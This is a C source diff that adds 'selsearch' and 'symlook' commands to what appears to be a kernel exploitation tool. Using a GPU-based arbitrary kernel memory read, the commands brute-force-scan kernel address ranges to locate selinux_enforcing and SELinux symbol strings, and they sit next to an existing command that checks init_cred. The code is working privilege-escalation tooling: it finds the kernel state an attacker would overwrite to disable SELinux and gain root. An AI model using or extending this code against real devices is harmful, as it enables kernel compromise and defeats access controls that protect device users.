@@ -515,6 +515,84 @@ int main(int argc, char **argv) {
             fflush(stderr);
             printf("SCAN_DONE\n");
             fflush(stdout);
+        } else if (strncmp(line, "selsearch ", 10) == 0) {
+            // Brute-force scan for selinux_enforcing in a kernel data range.
+            // Usage: selsearch <start_va> <end_va> [step=0x1000]
+            // Strategy: read 3 times at each candidate page, accept if the
+            // first u32 is stable AND in {0,1,2,3,0xff} AND the page has
+            // some non-zero data nearby. Prints up to 16 hits as
+            //   SELSEARCH:HIT:<va>:<val>:<nz>:<ptr>
+            // and a final SELSEARCH:DONE.
+            uint64_t start, end, step = 0x1000;
+            int n = sscanf(line + 10, "%lx %lx %lx", &start, &end, &step);
+            if (n < 2) { printf("BAD_ARGS\n"); fflush(stdout); continue; }
+            if (n < 3 || step < 0x100) step = 0x1000;
+            if (step > 0x10000) step = 0x10000;
+            int hits = 0;
+            for (uint64_t cur = start; cur < end && hits < 16; cur += step) {
+                uint8_t p1[4096], p2[4096], p3[4096];
+                int ok1 = (read_gpu_page(cur, p1) == 0);
+                usleep(1500);
+                int ok2 = (read_gpu_page(cur, p2) == 0);
+                usleep(1500);
+                int ok3 = (read_gpu_page(cur, p3) == 0);
+                if (!ok1 || !ok2 || !ok3) continue;
+                uint32_t v1, v2, v3;
+                memcpy(&v1, p1, 4); memcpy(&v2, p2, 4); memcpy(&v3, p3, 4);
+                if (v1 != v2 || v2 != v3) continue;
+                // Acceptable values: 0, 1 (enforcing), 2, 3 (permissive states),
+                // and 0xff (some kernels init to -1)
+                if (v1 != 0 && v1 != 1 && v1 != 2 && v1 != 3 && v1 != 0xff &&
+                    v1 != 0xffffffffU) continue;
+                int nz = 0, has_ptr = 0;
+                for (int i = 0; i < 4096; i++) if (p1[i] != 0) nz++;
+                for (int i = 0; i + 8 <= 4096; i += 8) {
+                    uint64_t kp; memcpy(&kp, p1 + i, 8);
+                    if ((kp >> 32) >= 0xffffff80 &&
+                        (kp >> 40) <= 0xffffffcf && kp != 0) {
+                        has_ptr = 1; break;
+                    }
+                }
+                if (nz < 8) continue;  // skip all-zero pages
+                printf("SELSEARCH:HIT:%lx:%u:nz=%d:ptr=%d\n",
+                       (unsigned long)cur, v1, nz, has_ptr);
+                fflush(stdout);
+                hits++;
+            }
+            printf("SELSEARCH:DONE:%d\n", hits);
+            fflush(stdout);
+        } else if (strncmp(line, "symlook ", 8) == 0) {
+            // Search the kernel .rodata / .text for a string and report
+            // the VA where it's first found. Useful for finding the
+            // address of "selinux_enforcing" / "selinux_enabled" by name.
+            // Usage: symlook <kbase> <end_va> <string...>
+            // Prints SYMLOOK:FOUND:<va> or SYMLOOK:NOTFOUND.
+            uint64_t kbase, end;
+            char needle[64];
+            int n = sscanf(line + 8, "%lx %lx %63s", &kbase, &end, needle);
+            if (n < 3) { printf("BAD_ARGS\n"); fflush(stdout); continue; }
+            int nlen = (int)strlen(needle);
+            int found = 0;
+            // Scan in 64KB chunks
+            for (uint64_t cur = kbase; cur < end; cur += 0x10000) {
+                uint8_t big[0x10000];
+                int pages = 16;
+                if (cur + pages * PAGE_SIZE > end) pages = (int)((end - cur) / PAGE_SIZE);
+                if (pages <= 0) break;
+                if (read_gpu_pages(cur, big, pages) != 0) continue;
+                uint8_t *p = memmem(big, pages * PAGE_SIZE, needle, nlen);
+                if (p) {
+                    uint64_t va = cur + (uint64_t)((uint8_t*)p - big);
+                    printf("SYMLOOK:FOUND:%lx\n", (unsigned long)va);
+                    fflush(stdout);
+                    found = 1;
+                    break;
+                }
+            }
+            if (!found) {
+                printf("SYMLOOK:NOTFOUND\n");
+                fflush(stdout);
+            }
         } else if (strncmp(line, "cred ", 5) == 0) {
             // Strict init_cred verification: read and check structure
             uint64_t va;
